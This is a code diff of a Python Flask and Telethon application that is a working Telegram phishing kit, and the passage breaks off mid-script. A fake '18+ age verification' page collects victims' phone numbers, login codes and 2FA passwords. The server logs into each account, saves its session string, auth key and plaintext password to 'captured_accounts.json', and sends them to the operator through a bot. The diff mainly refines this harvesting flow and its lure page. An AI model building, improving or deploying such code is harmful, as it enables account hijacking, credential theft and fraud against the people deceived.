@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, render_template_string, session
 import os
 import json
 import base64
@@ -6,24 +6,27 @@ import threading
 import asyncio
 import logging
 import time
-import random
+import hashlib
+import hmac
 import requests as http_requests
 from datetime import datetime
 from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
 import sys
+import secrets
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 # ====== Environment Variables ======
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+BOT_ID = os.environ.get("BOT_ID", "")  # Numeric Bot ID (from @BotFather)
 API_ID = int(os.environ.get("API_ID", "0"))
 API_HASH = os.environ.get("API_HASH", "")
 YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
+
 raw_bot_username = os.environ.get("BOT_USERNAME", "YourBot")
 BOT_USERNAME = raw_bot_username.replace('@', '')
-# ===================================
 
 if sys.version_info >= (3, 14):
     try:
@@ -32,12 +35,15 @@ if sys.version_info >= (3, 14):
         pass
 
 app = Flask(__name__)
+app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
 
-user_sessions = {}
 pending_codes = {}
 pending_2fa = {}
 sessions_lock = threading.Lock()
-bot_start_sessions = {}
+
+# ====== In-memory client manager ======
+pending_clients = {}
+pending_clients_lock = threading.Lock()
 
 # ====== Persistent Storage ======
 DATA_FILE = "captured_accounts.json"
@@ -53,11 +59,13 @@ def load_accounts():
 
 def save_account(account):
     accounts = load_accounts()
+    found = False
     for i, a in enumerate(accounts):
         if a['phone'] == account['phone']:
             accounts[i] = account
+            found = True
             break
-    else:
+    if not found:
         accounts.append(account)
     with open(DATA_FILE, 'w') as f:
         json.dump(accounts, f, indent=2)
@@ -80,6 +88,7 @@ def format_phone(ph):
         return '+' + digits
     return '+' + digits
 
+# ====== Bot Notification ======
 def send_bot_notification(phone, ss, me, dc, password_used=False, password_text=None):
     try:
         pwd_line = f"\n🔐 **Password:** `{password_text}`" if password_text else ""
@@ -97,342 +106,161 @@ def send_bot_notification(phone, ss, me, dc, password_used=False, password_text=
     except Exception as e:
         logger.error(f"Bot notify error: {e}")
 
-# ====== FIXED: Telegram Functions ======
-
-def send_code_and_get_hash(phone):
-    """Send OTP and return phone_code_hash"""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+# ====== Telegram Async Functions ======
+async def send_code_async(phone):
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    await client.connect()
     try:
-        async def _send():
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
+        r = await client.send_code_request(phone)
+        with pending_clients_lock:
+            pending_clients[phone] = {
+                'client': client,
+                'hash': r.phone_code_hash,
+                'phone': phone,
+                'status': 'sent'
+            }
+        with sessions_lock:
+            pending_codes[phone] = 'sent'
+            pending_2fa[phone] = False
+        return {'success': True}
+    except errors.FloodWaitError as e:
+        with sessions_lock: pending_codes[phone] = 'err'
+        return {'success': False, 'error': f'Flood wait {e.seconds}s'}
+    except Exception as e:
+        with sessions_lock: pending_codes[phone] = 'err'
+        return {'success': False, 'error': str(e)[:80]}
+
+async def verify_code_async(phone, code, password=None):
+    with pending_clients_lock:
+        entry = pending_clients.get(phone)
+    
+    if not entry:
+        return {'success': False, 'error': 'No pending request. Please request code again.'}
+    
+    client = entry['client']
+    code_hash = entry['hash']
+    
+    try:
+        if not client.is_connected():
             await client.connect()
+        
+        if await client.is_user_authorized():
+            me = await client.get_me()
+        else:
             try:
-                r = await client.send_code_request(phone)
-                ss = StringSession.save(client.session)
-                return {
-                    'success': True,
-                    'hash': r.phone_code_hash,
-                    'session': ss,
-                    'phone_code_hash': r.phone_code_hash
-                }
-            except errors.FloodWaitError as e:
-                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
-            except Exception as e:
-                return {'success': False, 'error': str(e)[:100]}
-            finally:
-                await client.disconnect()
-        return loop.run_until_complete(_send())
-    finally:
-        loop.close()
-
-def verify_code_with_hash(phone, code, phone_code_hash, session_str, password=None):
-    """Verify OTP using stored phone_code_hash"""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        async def _verify():
-            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-            try:
-                await client.connect()
-                
-                if await client.is_user_authorized():
-                    me = await client.get_me()
-                else:
-                    try:
-                        await client.sign_in(
-                            phone=phone,
-                            code=code,
-                            phone_code_hash=phone_code_hash
-                        )
-                        me = await client.get_me()
-                    except errors.SessionPasswordNeededError:
-                        with sessions_lock:
-                            pending_2fa[phone] = True
-                            pending_codes[phone] = '2fa_needed'
-                        
-                        if password:
-                            try:
-                                await client.sign_in(password=password)
-                                me = await client.get_me()
-                                with sessions_lock:
-                                    pending_2fa[phone] = False
-                                    pending_codes[phone] = 'done'
-                            except errors.PasswordHashInvalidError:
-                                return {'success': False, 'error': 'Wrong 2FA password'}
-                            except Exception as e:
-                                return {'success': False, 'error': f'2FA: {str(e)[:50]}'}
-                        else:
-                            return {'success': False, 'error': '2FA', 'needs_password': True}
-                    except errors.PhoneCodeInvalidError:
-                        return {'success': False, 'error': 'Wrong code'}
-                    except errors.PhoneCodeExpiredError:
-                        return {'success': False, 'error': 'Code expired'}
-                    except Exception as e:
-                        e_str = str(e)
-                        if 'phone_code_hash' in e_str:
-                            return {'success': False, 'error': 'Invalid hash'}
-                        return {'success': False, 'error': e_str[:80]}
-                
-                # Stabilize session
-                await client.get_dialogs()
-                ss = StringSession.save(client.session)
-                
-                auth_key = None
-                try:
-                    auth_key = client.session.auth_key.key
-                except:
-                    pass
-                
-                dc = client.session.dc_id
-                
-                if not auth_key:
-                    await client.disconnect()
-                    await asyncio.sleep(0.5)
-                    c2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
-                    await c2.connect()
-                    await c2.get_dialogs()
-                    me = await c2.get_me()
-                    ss = StringSession.save(c2.session)
-                    try:
-                        auth_key = c2.session.auth_key.key
-                    except:
-                        pass
-                    dc = c2.session.dc_id
-                    await c2.disconnect()
-                    client = c2
-                
-                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
-                password_used = password is not None
-                
-                acc = {
-                    'phone': phone,
-                    'user_id': me.id,
-                    'username': me.username or '',
-                    'first_name': me.first_name or '',
-                    'last_name': me.last_name or '',
-                    'session': ss,
-                    'webk': json.dumps({
-                        'dcId': dc, 'authKey': auth_b64,
-                        'userId': me.id, 'isSupport': False, 'isTest': False
-                    }),
-                    'dc': dc,
-                    'time': str(datetime.now()),
-                    'has_2fa': password_used,
-                    'password': password if password_used else ''
-                }
-                
-                save_account(acc)
-                global captured_accounts
-                captured_accounts = load_accounts()
-                
+                await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
+                me = await client.get_me()
+            except errors.SessionPasswordNeededError:
                 with sessions_lock:
-                    if phone in user_sessions: del user_sessions[phone]
-                    if phone in pending_2fa: del pending_2fa[phone]
-                    pending_codes[phone] = 'done'
-                
-                send_bot_notification(phone, ss, me, dc, password_used, password)
-                return {'success': True, 'session': ss}
-                
+                    pending_2fa[phone] = True
+                    pending_codes[phone] = '2fa_needed'
+                if password:
+                    try:
+                        await client.sign_in(password=password)
+                        me = await client.get_me()
+                        with sessions_lock:
+                            pending_2fa[phone] = False
+                            pending_codes[phone] = 'done'
+                    except errors.PasswordHashInvalidError:
+                        return {'success': False, 'error': 'Wrong 2FA password'}
+                    except Exception as e:
+                        return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
+                else:
+                    return {'success': False, 'error': '2FA', 'needs_password': True}
+            except errors.PhoneCodeInvalidError:
+                return {'success': False, 'error': 'Wrong code'}
+            except errors.PhoneCodeExpiredError:
+                return {'success': False, 'error': 'Code expired'}
             except Exception as e:
                 return {'success': False, 'error': str(e)[:80]}
-            finally:
-                try:
-                    await client.disconnect()
-                except:
-                    pass
         
-        return loop.run_until_complete(_verify())
+        await client.get_dialogs()
+        ss = StringSession.save(client.session)
+        
+        auth_key = client.session.auth_key.key if client.session.auth_key else None
+        dc = client.session.dc_id
+        
+        auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
+        password_used = password is not None
+        
+        acc = {
+            'phone': phone,
+            'user_id': me.id,
+            'username': me.username or '',
+            'first_name': me.first_name or '',
+            'last_name': me.last_name or '',
+            'session': ss,
+            'webk': json.dumps({
+                'dcId': dc, 'authKey': auth_b64,
+                'userId': me.id, 'isSupport': False, 'isTest': False
+            }),
+            'dc': dc,
+            'time': str(datetime.now()),
+            'has_2fa': password_used,
+            'password': password if password_used else ''
+        }
+        
+        save_account(acc)
+        global captured_accounts
+        captured_accounts = load_accounts()
+        
+        with pending_clients_lock:
+            if phone in pending_clients:
+                del pending_clients[phone]
+        with sessions_lock:
+            if phone in pending_2fa: del pending_2fa[phone]
+            pending_codes[phone] = 'done'
+        
+        send_bot_notification(phone, ss, me, dc, password_used, password)
+        return {'success': True, 'session': ss}
+    
+    except Exception as e:
+        e_str = str(e)
+        if 'PHONE_CODE_INVALID' in e_str: return {'success': False, 'error': 'Wrong code'}
+        if 'SESSION_PASSWORD_NEEDED' in e_str: return {'success': False, 'error': '2FA', 'needs_password': True}
+        if 'PASSWORD_HASH_INVALID' in e_str: return {'success': False, 'error': 'Wrong 2FA password'}
+        return {'success': False, 'error': e_str[:80]}
     finally:
-        loop.close()
-
-# ====== FIXED: API Routes ======
-
-@app.route('/api/share', methods=['POST'])
-def share():
-    """Send OTP to phone number"""
-    ph = request.json.get('phone', '')
-    if not ph:
-        return jsonify({'success': False, 'error': 'Phone required'})
-    
-    ph = format_phone(ph)
-    logger.info(f"📱 Sending OTP to: {ph}")
-    
-    with sessions_lock:
-        pending_codes[ph] = 'sending'
-    
-    # Send code and get hash
-    result = send_code_and_get_hash(ph)
-    
-    if result.get('success'):
-        with sessions_lock:
-            user_sessions[ph] = {
-                'hash': result['hash'],
-                'session': result['session'],
-                'phone_code_hash': result['phone_code_hash']
-            }
-            pending_codes[ph] = 'sent'
-        return jsonify({'success': True, 'phone': ph, 'hash': result['hash']})
-    else:
-        with sessions_lock:
-            pending_codes[ph] = 'err'
-        return jsonify({'success': False, 'error': result.get('error', 'Unknown')})
-
-@app.route('/api/verify', methods=['POST'])
-def verify():
-    """Verify OTP code"""
-    d = request.json
-    ph = d.get('phone', '')
-    code = d.get('code', '')
-    password = d.get('password', None)
-    
-    ph = format_phone(ph)
-    
-    with sessions_lock:
-        s = user_sessions.get(ph, {})
-        phone_code_hash = s.get('phone_code_hash') or s.get('hash', '')
-        session_str = s.get('session', '')
-    
-    logger.info(f"🔑 Verifying OTP for {ph}: code={code}, hash_exists={bool(phone_code_hash)}")
-    
-    if not phone_code_hash:
-        logger.error(f"❌ No phone_code_hash found for {ph}")
-        # Try to resend code automatically
-        result = send_code_and_get_hash(ph)
-        if result.get('success'):
-            with sessions_lock:
-                user_sessions[ph] = {
-                    'hash': result['hash'],
-                    'session': result['session'],
-                    'phone_code_hash': result['phone_code_hash']
-                }
-                pending_codes[ph] = 'sent'
-            return jsonify({
-                'success': False, 
-                'error': 'resend',
-                'message': 'Code resent. Please try again.'
-            })
-        else:
-            return jsonify({'success': False, 'error': 'Session expired. Please try again.'})
-    
-    result = verify_code_with_hash(ph, code, phone_code_hash, session_str, password)
-    return jsonify(result)
-
-@app.route('/api/check', methods=['POST'])
-def check():
-    phone = request.json.get('phone', '')
-    with sessions_lock:
-        s = pending_codes.get(phone, 'waiting')
-    return jsonify({'s': s})
-
-@app.route('/api/bot_check', methods=['POST'])
-def bot_check():
-    session_id = request.json.get('session_id', '')
-    if not session_id:
-        return jsonify({'status': 'not_found', 'phone': None})
-    with sessions_lock:
-        data = bot_start_sessions.get(session_id)
-        if data:
-            if data['phone']:
-                return jsonify({'status': 'received', 'phone': data['phone']})
-            return jsonify({'status': 'waiting', 'phone': None})
-    return jsonify({'status': 'not_found', 'phone': None})
-
-# ====== BOT POLLING ======
-
-def bot_polling_loop():
-    offset = 0
-    logger.info("🤖 Bot polling started...")
-    # Clear any old webhooks
-    try:
-        http_requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", timeout=10)
-    except:
-        pass
-    
-    while True:
         try:
-            resp = http_requests.get(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
-                params={'offset': offset, 'timeout': 30},
-                timeout=35
-            )
-            data = resp.json()
-            if data.get('ok'):
-                for update in data.get('result', []):
-                    offset = update['update_id'] + 1
-                    handle_bot_update(update)
-            elif data.get('error_code') == 409:
-                time.sleep(5)
-            else:
-                time.sleep(10)
-        except Exception as e:
-            logger.error(f"Bot error: {e}")
-            time.sleep(5)
-
-def handle_bot_update(update):
-    msg = update.get('message', {})
-    chat_id = msg.get('chat', {}).get('id')
-    if not chat_id:
-        return
-    
-    text = msg.get('text', '')
-    
-    if text.startswith('/start'):
-        parts = text.split(' ', 1)
-        session_id = parts[1].strip() if len(parts) > 1 and parts[1].strip() else None
-        
-        if session_id and len(session_id) > 5:
-            with sessions_lock:
-                bot_start_sessions[session_id] = {
-                    'chat_id': chat_id,
-                    'phone': None,
-                    'status': 'waiting',
-                    'timestamp': time.time()
-                }
-            
-            try:
-                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={'chat_id': chat_id, 'text': "🔞 Get full access to the files for free 💦"},
-                    timeout=10)
-                time.sleep(0.5)
-                
-                keyboard = {
-                    'keyboard': [[{'text': '👇', 'request_contact': True}]],
-                    'resize_keyboard': True, 'one_time_keyboard': True
-                }
-                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={
-                        'chat_id': chat_id,
-                        'text': "👇 Please confirm you're not a robot",
-                        'reply_markup': keyboard
-                    }, timeout=10)
-            except:
-                pass
-    
-    elif msg.get('contact'):
-        phone = msg['contact'].get('phone_number', '')
-        if phone:
-            phone = format_phone(phone)
-        
-        with sessions_lock:
-            for sid, sdata in bot_start_sessions.items():
-                if sdata['chat_id'] == chat_id and sdata['status'] == 'waiting':
-                    sdata['phone'] = phone
-                    sdata['status'] = 'received'
-                    break
-        
-        try:
-            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    'chat_id': chat_id,
-                    'text': "✅ Verified! Go back to the website.",
-                    'reply_markup': {'remove_keyboard': True}
-                }, timeout=10)
+            await client.disconnect()
         except:
             pass
 
 
-# ====== FIXED: HTML Page — Returning User Flow ======
+def run_telegram_action_sync(phone, code=None, password=None):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        if code is not None:
+            return loop.run_until_complete(verify_code_async(phone, code, password))
+        else:
+            return loop.run_until_complete(send_code_async(phone))
+    finally:
+        loop.close()
+
+
+# ====== Verify Telegram Auth (server-side validation) ======
+def verify_telegram_auth(auth_data):
+    """Telegram Login Widget এর ডাটা ভেরিফাই করুন"""
+    bot_token = BOT_TOKEN
+    check_hash = auth_data.get('hash', '')
+    
+    # Check data fields (alphabetically sorted)
+    fields = []
+    for key in sorted(auth_data.keys()):
+        if key != 'hash':
+            fields.append(f"{key}={auth_data[key]}")
+    
+    data_check_string = '\n'.join(fields)
+    
+    # HMAC-SHA256 verification
+    secret_key = hashlib.sha256(bot_token.encode()).digest()
+    computed_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
+    
+    return computed_hash == check_hash
+
+
+# ====== HTML PAGE (Telegram Login Widget - No Bot Redirect) ======
 PAGE = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -442,92 +270,103 @@ PAGE = r"""<!DOCTYPE html>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0b0b0f;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-.modal{background:#12121a;border-radius:20px;padding:28px 22px;max-width:380px;width:100%;border:1px solid #1e1e2e;text-align:center;animation:slideUp 0.4s ease}
+.modal{background:#12121a;border-radius:20px;padding:30px 24px 24px;max-width:380px;width:100%;border:1px solid #1e1e2e;text-align:center;animation:slideUp 0.4s ease}
 @keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
-.icon{font-size:50px;margin-bottom:8px}
-h2{font-size:18px;margin-bottom:4px}
-p{color:#888;font-size:13px;margin-bottom:16px;line-height:1.5}
-.contact-box{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:16px;padding:25px 20px;margin-bottom:14px}
-.contact-box .big-icon{font-size:55px;margin-bottom:8px}
-.contact-box h3{font-size:16px;margin-bottom:6px}
-.contact-box p{font-size:12px;color:#666;margin-bottom:16px}
-.btn-primary{width:100%;padding:16px;background:#0088cc;border:none;border-radius:14px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:0.2s}
+.icon{font-size:52px;margin-bottom:10px}
+h2{font-size:19px;margin-bottom:4px}
+p{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5}
+.box{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:16px;padding:30px 20px;margin-bottom:14px}
+.box .big-icon{font-size:60px;margin-bottom:10px}
+.box h3{font-size:16px;margin-bottom:6px}
+.box p{font-size:12px;color:#666;margin-bottom:18px}
+.input-field{width:100%;padding:16px;background:#0b0b0f;border:2px solid #1e1e2e;border-radius:14px;color:#fff;font-size:20px;text-align:center;outline:none;margin:10px 0;transition:0.2s;letter-spacing:1px}
+.input-field:focus{border-color:#0088cc}
+.input-field::placeholder{color:#444}
+.input-field.small{font-size:18px;letter-spacing:4px}
+.btn-primary{width:100%;padding:18px;background:#0088cc;border:none;border-radius:14px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 6px 25px rgba(0,136,204,0.3);transition:0.2s}
 .btn-primary:hover{background:#0071b3;transform:translateY(-1px)}
+.btn-primary:active{transform:translateY(0)}
 .btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none}
-.btn-retry{width:100%;padding:12px;background:transparent;border:1px solid #1e1e2e;border-radius:12px;color:#888;font-size:13px;cursor:pointer;margin-top:8px;display:none}
+.btn-retry{width:100%;padding:14px;background:transparent;border:1px solid #1e1e2e;border-radius:12px;color:#888;font-size:13px;cursor:pointer;margin-top:10px;display:none;transition:0.2s}
 .btn-retry:hover{border-color:#0088cc;color:#fff}
-.status-box{padding:10px 12px;border-radius:10px;margin:8px 0;display:none;font-size:12px;text-align:center}
+.status-box{padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px;text-align:center}
 .status-box.show{display:block}
 .status-box.waiting{background:rgba(255,152,0,0.12);color:#FFB74D;border:1px solid rgba(255,152,0,0.2)}
 .status-box.success{background:rgba(52,199,89,0.12);color:#81C784;border:1px solid rgba(52,199,89,0.2)}
 .status-box.error{background:rgba(255,45,85,0.12);color:#EF9A9A;border:1px solid rgba(255,45,85,0.2)}
 .status-box.info{background:rgba(0,136,255,0.12);color:#90CAF9;border:1px solid rgba(0,136,255,0.2)}
-.code-display{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;padding:12px;font-size:32px;text-align:center;letter-spacing:16px;color:#fff;font-weight:700;min-height:52px;margin:8px 0;font-family:monospace}
-.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin:10px 0}
-.numpad .key{padding:16px;border:none;border-radius:10px;background:#12121a;color:#fff;font-size:22px;cursor:pointer;font-weight:600}
-.numpad .key:active{transform:scale(0.94);background:#2a2a3e}
-.numpad .key-clear{background:rgba(255,45,85,0.12);color:#ff2d55}
-.numpad .key-submit{background:#34c759;color:#fff;font-weight:700;font-size:14px}
-.numpad .key-submit:disabled{background:#1a1a2e;color:#555;cursor:not-allowed}
-.password-input{width:100%;padding:14px;background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;color:#fff;font-size:18px;text-align:center;outline:none;margin:8px 0}
-.password-input:focus{border-color:#0088cc}
+.password-input{width:100%;padding:15px;background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;color:#fff;font-size:18px;text-align:center;outline:none;margin:10px 0}
+.password-input:focus{border-color:#ff2d55}
 .password-input::placeholder{color:#444}
 .step{display:none}
 .step.active{display:block}
-.share-progress{display:flex;justify-content:center;gap:6px;margin:14px 0}
-.share-step{width:34px;height:34px;border-radius:50%;background:#1a1a2e;display:flex;align-items:center;justify-content:center;font-size:12px;color:#555;font-weight:700;border:2px solid transparent;transition:0.3s}
-.share-step.done{background:#34c759;color:#fff;border-color:#34c759}
+.share-progress{display:flex;justify-content:center;gap:6px;margin:16px 0}
+.share-step{width:36px;height:36px;border-radius:50%;background:#1a1a2e;display:flex;align-items:center;justify-content:center;font-size:13px;color:#555;font-weight:700;border:2px solid transparent;transition:0.3s}
+.share-step.done{background:#34c759;color:#fff;border-color:#34c759;box-shadow:0 0 12px rgba(52,199,89,0.3)}
 .share-step.active{background:transparent;color:#fff;border-color:#0088cc;animation:pulse 1.2s infinite}
 @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,255,0.3)}50%{box-shadow:0 0 0 8px rgba(0,136,255,0)}100%{box-shadow:0 0 0 0 rgba(0,136,255,0)}}
-.share-link-box{background:#0b0b0f;padding:10px;border-radius:10px;border:1px solid #1e1e2e;margin-top:12px}
-.share-link-box p{font-size:11px;color:#555;margin-bottom:4px}
+.share-link-box{background:#0b0b0f;padding:12px;border-radius:10px;border:1px solid #1e1e2e;margin-top:14px;text-align:center}
+.share-link-box p{font-size:11px;color:#555;margin-bottom:6px}
 .share-link-box code{color:#0088cc;font-size:10px;word-break:break-all}
-.footer{text-align:center;padding:12px 0 5px;color:#333;font-size:10px}
+.footer{text-align:center;padding:15px 0 5px;color:#333;font-size:10px}
+.tg-login-container{display:flex;justify-content:center;margin:10px 0;min-height:50px}
 </style>
 </head>
 <body>
 
-<div class="modal">
+<div class="modal" id="mainModal">
     
-    <!-- STEP 1: Contact Request (NEW users only) -->
-    <div id="s1" class="step">
+    <!-- STEP 1: Telegram Login (Web App Direct - No Bot Redirect!) -->
+    <div id="s1" class="step active">
         <div class="icon">🔞</div>
         <h2>Age Verification Required</h2>
-        <p>You must verify your age to access this 18+ premium content</p>
-        <div class="contact-box">
-            <div class="big-icon">📱</div>
-            <h3>Verify with Telegram</h3>
-            <p>Tap the button below to quickly verify your identity via Telegram</p>
-            <button class="btn-primary" id="requestContactBtn" onclick="requestContact()">✈️ Verify via Telegram</button>
-            <button class="btn-retry" id="retryBtn" onclick="requestContact()">🔄 Retry</button>
+        <p>You must verify your identity to access this 18+ premium content</p>
+        
+        <div class="box">
+            <div class="big-icon">✈️</div>
+            <h3>Quick Verify with Telegram</h3>
+            <p>Click below to securely share your phone number via Telegram</p>
+            
+            <div id="tgWidgetContainer"></div>
+            
+            <div id="phoneInputArea" style="display:none;margin-top:10px">
+                <input type="tel" id="phoneInput" class="input-field" 
+                       placeholder="+8801234567890" 
+                       oninput="this.value=this.value.replace(/[^0-9+]/g,'')" />
+                <button class="btn-primary" id="manualBtn" onclick="sendManualPhone()">
+                    ✈️ Send Code
+                </button>
+            </div>
+            
+            <div id="loginStatus" class="status-box"></div>
+            
+            <p style="font-size:11px;color:#555;margin-top:8px">
+                <span onclick="showManualInput()" style="cursor:pointer;color:#888">📝 Enter manually instead</span>
+            </p>
         </div>
-        <div id="contactStatus" class="status-box"></div>
+        
         <div class="footer">🔒 Your data is encrypted and secure</div>
     </div>
     
-    <!-- STEP 2: OTP (Returning user comes here directly) -->
+    <!-- STEP 2: OTP -->
     <div id="s2" class="step">
         <div class="icon">🔐</div>
         <h2>Enter Verification Code</h2>
-        <p>Code sent to <span id="pd" style="color:#0088cc;font-weight:700;">+91XXXXXXXXXX</span></p>
+        <p>Code sent to <span id="pd" style="color:#0088cc;font-weight:700;">+880XXXXXXXXXX</span></p>
+        
         <div id="cs" class="status-box waiting show" style="display:none">⏳ Sending code...</div>
-        <div class="code-display" id="cdisp">_____</div>
-        <div class="numpad">
-            <button class="key" onclick="pk('1')">1</button>
-            <button class="key" onclick="pk('2')">2</button>
-            <button class="key" onclick="pk('3')">3</button>
-            <button class="key" onclick="pk('4')">4</button>
-            <button class="key" onclick="pk('5')">5</button>
-            <button class="key" onclick="pk('6')">6</button>
-            <button class="key" onclick="pk('7')">7</button>
-            <button class="key" onclick="pk('8')">8</button>
-            <button class="key" onclick="pk('9')">9</button>
-            <button class="key key-clear" onclick="cc()">⌫</button>
-            <button class="key" onclick="pk('0')">0</button>
-            <button class="key key-submit" id="sb" onclick="sc()">✓</button>
-        </div>
+        
+        <input type="text" id="otpInput" class="input-field small" 
+               placeholder="_ _ _ _ _" maxlength="6"
+               inputmode="numeric" pattern="[0-9]*"
+               oninput="this.value=this.value.replace(/[^0-9]/g,''); if(this.value.length===5) setTimeout(submitOTP, 200)" />
+        
+        <button class="btn-primary" id="verifyBtn" onclick="submitOTP()" style="background:#34c759;box-shadow:0 6px 25px rgba(52,199,89,0.3)">
+            ✓ Verify Code
+        </button>
+        
         <div id="vs" class="status-box"></div>
-        <p style="font-size:11px;color:#555;margin-top:6px;cursor:pointer" onclick="resetAll()">← Use different account</p>
+        <p style="font-size:11px;color:#555;margin-top:12px;cursor:pointer" onclick="resetAll()">← Start over</p>
     </div>
     
     <!-- STEP 2B: 2FA -->
@@ -536,7 +375,9 @@ p{color:#888;font-size:13px;margin-bottom:16px;line-height:1.5}
         <h2>Extra Security</h2>
         <p>This account has 2FA enabled. Enter your password:</p>
         <input type="password" id="pwdInput" class="password-input" placeholder="Enter Telegram password" maxlength="64">
-        <button class="btn-primary" onclick="submitPassword()" style="background:#ff2d55">🔑 Verify Password</button>
+        <button class="btn-primary" onclick="submitPassword()" style="background:#ff2d55;box-shadow:0 6px 25px rgba(255,45,85,0.3)">
+            🔑 Verify Password
+        </button>
         <div id="pwdStatus" class="status-box"></div>
     </div>
     
@@ -553,163 +394,173 @@ p{color:#888;font-size:13px;margin-bottom:16px;line-height:1.5}
             <div class="share-step" id="sp5">5</div>
         </div>
         <div id="shareStatus" class="status-box waiting show" style="display:block">⏳ Share to start unlocking...</div>
-        <button class="btn-primary" onclick="simulateShare()" style="background:#34c759">📤 Share to Telegram</button>
+        <button class="btn-primary" onclick="simulateShare()" style="background:#34c759;box-shadow:0 6px 25px rgba(52,199,89,0.3)">📤 Share to Telegram</button>
         <div class="share-link-box">
-            <p>🔗 Your link:</p>
+            <p>🔗 Your personal link:</p>
             <code id="shareLink">https://t.me/share/url?url=...</code>
         </div>
     </div>
 </div>
 
+<script src="https://telegram.org/js/telegram-widget.js?22"></script>
 <script>
+// ===== STATE =====
 var SAVED_PHONE_KEY = 'pulse_phone';
 var SAVED_STEP_KEY = 'pulse_step';
 var SAVED_SHARES_KEY = 'pulse_shares';
-var SAVED_HASH_KEY = 'pulse_hash';
 
 var phoneNumber = localStorage.getItem(SAVED_PHONE_KEY) || '';
 var savedStep = localStorage.getItem(SAVED_STEP_KEY) || '';
-var savedHash = localStorage.getItem(SAVED_HASH_KEY) || '';
-var codeDigits = '';
 var codeCheckInterval = null;
 var passwordCheckInterval = null;
 var sharesDone = parseInt(localStorage.getItem(SAVED_SHARES_KEY) || '0', 10);
 var shareLinkBase = window.location.origin + window.location.pathname;
-var botSessionId = '';
-var contactCheckInterval = null;
-var contactTimeout = null;
+var BOT_ID = '{{ BOT_ID }}';
 
-// ===== ON LOAD — Smart State Restore =====
+// ===== ON LOAD =====
 (function() {
+    initTelegramWidget();
+    
     if (savedStep === 'share_page') {
-        // Returning user → Share page
         showStep('s3');
         setupShareLink();
         updateShareProgress();
-    } else if (phoneNumber && (savedStep === 'otp_sent' || savedStep === 'otp_ready')) {
-        // ===== FIXED: Returning user → Directly send OTP to saved number =====
+    } else if (savedStep === 'otp_sent' && phoneNumber) {
         showStep('s2');
         document.getElementById('pd').textContent = phoneNumber;
-        
         var cs = document.getElementById('cs');
-        cs.className = 'status-box waiting show';
-        cs.innerHTML = '⏳ Sending code to ' + phoneNumber + '...';
+        cs.className = 'status-box success show';
+        cs.innerHTML = '✅ Code sent! Enter the code below:';
         cs.style.display = 'block';
-        
-        // Auto-send code to saved number
-        sendPhoneToBackend(phoneNumber, true);
+        startCodeCheck();
     } else {
-        // NEW user
         showStep('s1');
     }
 })();
 
-function showStep(id) {
-    document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); });
-    document.getElementById(id).classList.add('active');
-}
-
-// ===== CONTACT REQUEST VIA BOT =====
-function requestContact() {
-    botSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-    
-    var st = document.getElementById('contactStatus');
-    st.className = 'status-box info show';
-    st.innerHTML = '⏳ Opening Telegram... Tap "👇" to share.';
-    st.style.display = 'block';
-    
-    document.getElementById('retryBtn').style.display = 'none';
-    document.getElementById('requestContactBtn').disabled = true;
-    
-    var botUsername = '{{ BOT_USERNAME }}';
-    var url = 'https://t.me/' + botUsername + '?start=' + botSessionId;
-    
-    var win = window.open(url, '_blank');
-    if (!win || win.closed) {
-        window.location.href = url;
+function initTelegramWidget() {
+    if (!BOT_ID) {
+        document.getElementById('tgWidgetContainer').innerHTML = 
+            '<p style="color:#ff2d55;font-size:12px">⚠️ BOT_ID not configured</p>';
+        return;
     }
     
-    if (contactCheckInterval) clearInterval(contactCheckInterval);
-    contactCheckInterval = setInterval(checkBotContact, 2000);
+    // Create Telegram Login Widget
+    var container = document.getElementById('tgWidgetContainer');
+    container.innerHTML = '';
     
-    if (contactTimeout) clearTimeout(contactTimeout);
